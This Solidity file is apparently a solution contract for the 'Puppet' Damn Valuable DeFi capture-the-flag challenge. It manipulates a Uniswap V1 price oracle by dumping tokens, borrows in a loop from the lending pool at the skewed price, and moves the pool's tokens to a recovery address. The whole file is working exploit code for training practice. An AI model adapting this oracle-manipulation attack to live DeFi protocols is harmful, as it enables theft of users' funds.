// SPDX-License-Identifier: MIT
pragma solidity =0.8.25;

import {IUniswapV1Exchange} from "../../src/puppet/IUniswapV1Exchange.sol";
import {PuppetPool} from "../../src/puppet/PuppetPool.sol";
import {DamnValuableToken} from "../../src/DamnValuableToken.sol";

contract AttackPuppet {
    uint256 constant PLAYER_INITIAL_TOKEN_BALANCE = 1000e18;
    uint256 constant POOL_INITIAL_TOKEN_BALANCE = 100_000e18;

    function attack(address _pool, address recovery) external {
        address player = address(this);
        PuppetPool lendingPool = PuppetPool(_pool);
        IUniswapV1Exchange uniswapV1Exchange = IUniswapV1Exchange(lendingPool.uniswapPair());
        DamnValuableToken token = DamnValuableToken(lendingPool.token());
        token.approve(address(uniswapV1Exchange), type(uint256).max);
        uniswapV1Exchange.tokenToEthTransferInput(PLAYER_INITIAL_TOKEN_BALANCE, 1, block.timestamp + 100, player);
        for (uint256 i = 0; i < 10; i++) {
            lendingPool.borrow{value: address(this).balance}(PLAYER_INITIAL_TOKEN_BALANCE * 10, player);
            uniswapV1Exchange.tokenToEthTransferInput(PLAYER_INITIAL_TOKEN_BALANCE * 10, 1, block.timestamp + i, player);
        }
        uniswapV1Exchange.ethToTokenSwapOutput{value: address(this).balance}(
            POOL_INITIAL_TOKEN_BALANCE, block.timestamp + 10
        );

        token.transfer(recovery, POOL_INITIAL_TOKEN_BALANCE);

        payable(msg.sender).transfer(address(this).balance);
    }

    receive() external payable {}
}
